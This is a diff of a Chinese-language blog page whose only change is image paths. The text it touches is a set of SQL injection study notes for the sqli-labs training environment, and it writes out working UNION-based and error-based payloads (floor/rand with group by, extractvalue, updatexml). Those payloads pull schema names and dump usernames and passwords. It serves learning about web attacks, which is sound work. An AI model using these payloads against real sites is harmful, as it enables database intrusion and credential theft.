@@ -184,7 +184,7 @@ line-height: 20px;
 <p>三 cookie 注入，没什么好说的，和post注入没什么区别，因为cookie要进SQL查询，故而，会产生注入。。。<br>登的时候burp抓个包慢慢注入就行了<br>四referer 这个时候需要他与数据库有交互，一般后台是要将referer头来记录进数据库，所以这个时候后台常见的函数是inster into 和updata<br>这个时候一般就使用’来和后面构成完整语句，不注释。</p>
 </li>
 </ol>
-<p><img src="%5Cimages%5Cpasted-19.png%5C" alt="upload successful"><br>最后，随着往后继续搞sqli-lab基本就是和各种过滤打交道了</p>
+<p><img src="images%5Cpasted-19.png%5C" alt="upload successful"><br>最后，随着往后继续搞sqli-lab基本就是和各种过滤打交道了</p>
 </div>
           
         </div>
@@ -210,16 +210,16 @@ line-height: 20px;
 <p>再来翻译一遍，将原来的表看成一个班级，原来表的排序方式是在上课，这个时候，要下课排路队了，group by老师先看一个学生是那个路队，再将他送进那个路队，但是，现在有一个叫floor(rand()*2)的学生，他随机显示自己要去那个路队，如果两次一样，没有错误，但是如果第一次是1，他告诉老师要去1路队，老师要将他送进路队时候，他又rand()了一次，变成了0，报错。  </p>
 <h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>环境 less-11</p>
 <p>先起一个post请求，抓包，通过’输入，报错信息可以知道，应该是被’包裹，故而尝试 1’ or 1 %23 登录成功<br>之后，再burp中，oder by得到字段个数为2；</p>
-<p><img src="%5Cimages%5Cpasted-10.png%5C" alt="upload successful"></p>
-<p><img src="%5Cimages%5Cpasted-11.png%5C" alt="upload successful"><br>没有回显，尝试使用报错信息来回显  </p>
-<p><img src="%5Cimages%5Cpasted-12.png%5C" alt="upload successful"></p>
-<p><img src="%5Cimages%5Cpasted-13.png%5C" alt="upload successful"><br>得到了数据库名，之要count(1/0/*)是由于group by 语法  </p>
-<p><img src="%5Cimages%5Cpasted-14.png%5C" alt="upload successful"><br>Count是聚合函数;<br>这个时候，我们再上面database()的地方执行SQL语句。注意，这里要用()来包裹要执行的语句<br><code>1&#39; union select 233,count(*) from information_schema.schemata group by concat(floor(rand(0)*2),(select group_concat(schema_name) from information_schema.schemata))</code></p>
+<p><img src="images%5Cpasted-10.png%5C" alt="upload successful"></p>
+<p><img src="images%5Cpasted-11.png%5C" alt="upload successful"><br>没有回显，尝试使用报错信息来回显  </p>
+<p><img src="images%5Cpasted-12.png%5C" alt="upload successful"></p>
+<p><img src="images%5Cpasted-13.png%5C" alt="upload successful"><br>得到了数据库名，之要count(1/0/*)是由于group by 语法  </p>
+<p><img src="images%5Cpasted-14.png%5C" alt="upload successful"><br>Count是聚合函数;<br>这个时候，我们再上面database()的地方执行SQL语句。注意，这里要用()来包裹要执行的语句<br><code>1&#39; union select 233,count(*) from information_schema.schemata group by concat(floor(rand(0)*2),(select group_concat(schema_name) from information_schema.schemata))</code></p>
 <p>前面的from information_schema.schemata 改成tables等等没有影响，但是要保证语句正确。  </p>
-<p><img src="%5Cimages%5Cpasted-15.png%5C" alt="upload successful"><br>得到  </p>
-<p><img src="%5Cimages%5Cpasted-16.png%5C" alt="upload successful"><br>库名；<br>同理可得表名，如果回显的不足，可以使用limit 0,1来分别获取。<br>然后 其实也可以使用extractvalue函数与1’union select 4,extractvalue(1,(select database())) #</p>
-<p><img src="%5Cimages%5Cpasted-17.png%5C" alt="upload successful"></p>
-<p><img src="%5Cimages%5Cpasted-18.png%5C" alt="upload successful"><br>爆出了库名<br>一定要注意()的位置，extractvalue后的语句用()包裹，concat也是而之后的查询语句也用了一个()包裹，虽然我不知道为什么这么多人喜欢用0x7e。。。<br>Updataxml差不多，不过要三个参数，中间的写一个查询语句。</p>
+<p><img src="images%5Cpasted-15.png%5C" alt="upload successful"><br>得到  </p>
+<p><img src="images%5Cpasted-16.png%5C" alt="upload successful"><br>库名；<br>同理可得表名，如果回显的不足，可以使用limit 0,1来分别获取。<br>然后 其实也可以使用extractvalue函数与1’union select 4,extractvalue(1,(select database())) #</p>
+<p><img src="images%5Cpasted-17.png%5C" alt="upload successful"></p>
+<p><img src="images%5Cpasted-18.png%5C" alt="upload successful"><br>爆出了库名<br>一定要注意()的位置，extractvalue后的语句用()包裹，concat也是而之后的查询语句也用了一个()包裹，虽然我不知道为什么这么多人喜欢用0x7e。。。<br>Updataxml差不多，不过要三个参数，中间的写一个查询语句。</p>
 <p>一点小经验，个人觉得这个最麻烦的就是括号，所以在构造语句的时候不如把函数的()一起打上，不然最后保证他的对齐很麻烦。</p>
 </div>
           
@@ -245,16 +245,16 @@ line-height: 20px;
 <pre><code>select * from &lt;表&gt; where id = 1 </code></pre>
 <p>判断方式：</p>
 <pre><code>?id=1 and 1=1 #</code></pre>
-<p>不报错<br>    <code>?id =1 and 1=2 # </code><br>报错<br>如果为字符型 那么后台应该为<br><code>select * from &lt;表&gt; where id = &#39;1 and 1=1&#39;</code><br><code>select * from &lt;表&gt; where id = &#39;1 and 1=2&#39;</code><br>报错；<br>当然，也可通过报错信息来判断<br><img src="%5Cimages%5Cpasted-0.png%5C" alt="upload successful"><br>其中，左右两个’用来包裹错误信息，可以忽略<br>Limit 0,1意思为从第0个数据开始，每次只读取1个;<br>查看源代码，可以验证<br><img src="%5Cimages%5Cpasted-1.png%5C" alt="upload successful"></p>
+<p>不报错<br>    <code>?id =1 and 1=2 # </code><br>报错<br>如果为字符型 那么后台应该为<br><code>select * from &lt;表&gt; where id = &#39;1 and 1=1&#39;</code><br><code>select * from &lt;表&gt; where id = &#39;1 and 1=2&#39;</code><br>报错；<br>当然，也可通过报错信息来判断<br><img src="images%5Cpasted-0.png%5C" alt="upload successful"><br>其中，左右两个’用来包裹错误信息，可以忽略<br>Limit 0,1意思为从第0个数据开始，每次只读取1个;<br>查看源代码，可以验证<br><img src="images%5Cpasted-1.png%5C" alt="upload successful"></p>
 <p>字符型:通过<br><code>?id=1&#39; and &#39;1&#39;=&#39;1</code><br><code>?id=2’ and &#39;1&#39;=&#39;2</code><br>判断当然，如果不是白盒，我们很难一开始就知道到底是被’ “ 还是一堆奇奇怪怪的入)”包裹，所以fuzz吧。<br>#####实验<br>数字型: 环境sqlilab-less2</p>
-<p><img src="%5Cimages%5Cpasted-2.png%5C" alt="upload successful"></p>
-<p><img src="%5Cimages%5Cpasted-3.png%5C" alt="upload successful"><br>可知为三列，加带力度。</p>
-<p><img src="%5Cimages%5Cpasted-4.png%5C" alt="upload successful"></p>
-<p><img src="%5Cimages%5Cpasted-5.png%5C" alt="upload successful"><br>首先<br>通过Information_schema库下schemata表中 schema_name获得所有数据库名;如<br><code>?id=-1 union select 233,schema_name,666 from information_schema.schemata %23</code>其中233与666为占位，随便输。<br>但是现在只显示一行，可以使用group_concat()包裹列名;<br>之后来查询当前数据库中的表名<br>使用到information_schema 下tables表中table_name列；<br>又因为此列包含mysql中所有表名，故而，结尾限定<br><code>where table_schema = database()</code><br><code>?id=-1 union select 12,group_concat(table_name),233  from information_schema.tables where table_schema = database() %23</code></p>
-<p><img src="%5Cimages%5Cpasted-6.png%5C" alt="upload successful"><br>其中 users表一般会储藏敏感信息；<br>故而，继续查询其中的字段<br>仍旧通过information_schema库下，columns表column_name列<br>结尾限定table_schema = database() and table_name=’要查询的表名，这里是users’<br><code>?id=-1 union select 2,group_concat(column_name),233 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; %23</code><br>(table_schema和table_name是columns表中另外两个列的名字，用于记录表中字段对应的表名和库名；  </p>
-<p><img src="%5Cimages%5Cpasted-7.png%5C" alt="upload successful"><br>然后 查询username ,password<br>注意这次查询实在当前数据库中的users表<br><code>?id=-1 union select 2,username,password from security.users #</code>  </p>
-<p><img src="%5Cimages%5Cpasted-8.png%5C" alt="upload successful"><br>只显示一行使用group_concat后混乱，所以使用concat_ws进行拼接<br><code>?id=-1 union select 2,group_concat(concat_ws(&#39;:&#39;,username,password)),2 from security.users #</code> </p>
-<p><img src="%5Cimages%5Cpasted-9.png%5C" alt="upload successful"></p>
+<p><img src="images%5Cpasted-2.png%5C" alt="upload successful"></p>
+<p><img src="images%5Cpasted-3.png%5C" alt="upload successful"><br>可知为三列，加带力度。</p>
+<p><img src="images%5Cpasted-4.png%5C" alt="upload successful"></p>
+<p><img src="images%5Cpasted-5.png%5C" alt="upload successful"><br>首先<br>通过Information_schema库下schemata表中 schema_name获得所有数据库名;如<br><code>?id=-1 union select 233,schema_name,666 from information_schema.schemata %23</code>其中233与666为占位，随便输。<br>但是现在只显示一行，可以使用group_concat()包裹列名;<br>之后来查询当前数据库中的表名<br>使用到information_schema 下tables表中table_name列；<br>又因为此列包含mysql中所有表名，故而，结尾限定<br><code>where table_schema = database()</code><br><code>?id=-1 union select 12,group_concat(table_name),233  from information_schema.tables where table_schema = database() %23</code></p>
+<p><img src="images%5Cpasted-6.png%5C" alt="upload successful"><br>其中 users表一般会储藏敏感信息；<br>故而，继续查询其中的字段<br>仍旧通过information_schema库下，columns表column_name列<br>结尾限定table_schema = database() and table_name=’要查询的表名，这里是users’<br><code>?id=-1 union select 2,group_concat(column_name),233 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; %23</code><br>(table_schema和table_name是columns表中另外两个列的名字，用于记录表中字段对应的表名和库名；  </p>
+<p><img src="images%5Cpasted-7.png%5C" alt="upload successful"><br>然后 查询username ,password<br>注意这次查询实在当前数据库中的users表<br><code>?id=-1 union select 2,username,password from security.users #</code>  </p>
+<p><img src="images%5Cpasted-8.png%5C" alt="upload successful"><br>只显示一行使用group_concat后混乱，所以使用concat_ws进行拼接<br><code>?id=-1 union select 2,group_concat(concat_ws(&#39;:&#39;,username,password)),2 from security.users #</code> </p>
+<p><img src="images%5Cpasted-9.png%5C" alt="upload successful"></p>
 <p>当后面注释不可用的时候，试试–+ /* 或者通过闭合来查询；</p>
 </div>
           
